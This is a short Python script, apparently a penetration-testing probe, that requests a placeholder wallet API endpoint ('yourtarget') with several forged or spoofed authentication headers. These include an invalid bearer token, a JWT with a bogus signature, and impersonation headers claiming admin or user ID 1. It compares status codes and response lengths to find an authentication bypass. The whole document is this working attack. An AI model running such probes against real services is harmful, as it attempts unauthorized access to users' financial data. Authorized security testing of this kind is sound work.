import requests

url = "https://api.yourtarget.com/wallets/v1/user/encrypted"
test_headers = [
    {},
    {"Authorization": "Bearer invalid_token_test"},
    {"Authorization": "JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.sf"},
    {"X-Consumer-Custom-ID": "admin"},
    {"X-User-Id": "1"}
]

for h in test_headers:
    r = requests.get(url, headers=h, timeout=4)
    print(f"Headers {h} -> Status: {r.status_code} | Len: {len(r.content)}")
